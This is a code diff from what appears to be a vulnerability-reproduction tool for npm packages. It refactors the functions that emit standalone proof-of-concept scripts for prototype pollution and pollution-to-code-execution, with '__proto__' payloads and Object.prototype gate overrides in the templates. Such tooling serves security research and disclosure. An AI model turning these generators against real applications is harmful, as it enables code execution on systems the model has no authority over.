@@ -98,28 +98,39 @@ export async function reproduceRce(packageName, entryPoint, spec, opts = {}) {
   };
 }
 
-// Auto-discovery names a bare-function-export entry point after the package
-// itself (discovery.js: `module.exports = fn` registers { name: packageName,
-// fn: targetModule }), so entryPoint === pkg identifies that case. Such a
-// module must be called directly — `target.${entryPoint}(...)` is invalid JS
-// once entryPoint contains characters that can't be a bare property name
-// (a hyphenated package name, a filesystem path, etc).
-function callExpr(pkg, entryPoint, argsStr) {
-  return entryPoint === pkg ? `target(${argsStr})` : `target.${entryPoint}(${argsStr})`;
+// ─── Standalone PoC builders (exact minimal reproduction) ────────────────────
+
+/**
+ * Render how to invoke `entryPoint` on the `target` require()'d in the PoC.
+ * Three cases:
+ *   - entryPoint IS the package name (bare-function module, e.g. `module.exports
+ *     = fn` for merge-deep/deep-extend) → call `target` directly, never
+ *     `target.<hyphenated-name>(...)`, which would be invalid JS.
+ *   - entryPoint is a dotted path of valid identifiers (e.g. 'utils.extend') →
+ *     plain dot notation.
+ *   - anything else (unusual/non-identifier property names) → bracket notation,
+ *     which is safe for any string.
+ */
+function targetRef(pkg, entryPoint) {
+  if (entryPoint === pkg) return 'target';
+  const segments = String(entryPoint).split('.');
+  const validIdent = /^[A-Za-z_$][A-Za-z0-9_$]*$/;
+  if (segments.every(s => validIdent.test(s))) return `target.${entryPoint}`;
+  return `target${segments.map(s => `[${JSON.stringify(s)}]`).join('')}`;
 }
 
-// ─── Standalone PoC builders (exact minimal reproduction) ────────────────────
 function buildProtoPoC(pkg, version, entryPoint, descriptor, res) {
   const spec = version ? `${pkg}@${version}` : pkg;
   const valJson = JSON.stringify(descriptor.value);
   const conv = res.callConvention || 'fn({}, payload)';
-  const call = (conv.startsWith("fn({}, '")
-    ? callExpr(pkg, entryPoint, `{}, '__proto__.${descriptor.property}', ${valJson}`)
+  const ref = targetRef(pkg, entryPoint);
+  const call = conv.startsWith("fn({}, '")
+    ? `${ref}({}, '__proto__.${descriptor.property}', ${valJson});`
     : conv === 'fn(true, {}, payload)'
-      ? callExpr(pkg, entryPoint, 'true, {}, payload')
+      ? `${ref}(true, {}, payload);`
       : conv === 'fn(payload)'
-        ? callExpr(pkg, entryPoint, 'payload')
-        : callExpr(pkg, entryPoint, '{}, payload')) + ';';
+        ? `${ref}(payload);`
+        : `${ref}({}, payload);`;
   return `// PoC — prototype pollution in ${spec} via ${entryPoint}()
 // Reproduced independently in ${res.runs || 2} fresh Node processes.
 const target = require('${pkg}');
@@ -131,11 +142,12 @@ console.log(({}).${descriptor.property}); // => ${valJson}  (Object.prototype po
 function buildRcePoC(pkg, version, entryPoint, spec, res) {
   const specStr = version ? `${pkg}@${version}` : pkg;
   const gateLines = (res.gates || []).map(g => `Object.prototype.${g} = true; // force guarded branch`).join('\n');
+  const ref = targetRef(pkg, entryPoint);
   return `// PoC — prototype pollution -> code execution in ${specStr} via ${entryPoint}()
 // Reproduced independently in ${res.runs || 2} fresh Node processes (canary fired).
 const target = require('${pkg}');
 ${gateLines ? gateLines + '\n' : ''}// attacker-controlled payload on the polluted property (${res.payloadType})
 Object.prototype.${spec.property} = "<attacker code>";
-${callExpr(pkg, entryPoint, '/* attacker-influenced input */')};
+${ref}(/* attacker-influenced input */);
 // The polluted property reaches a code-execution sink and runs attacker code.`;
 }
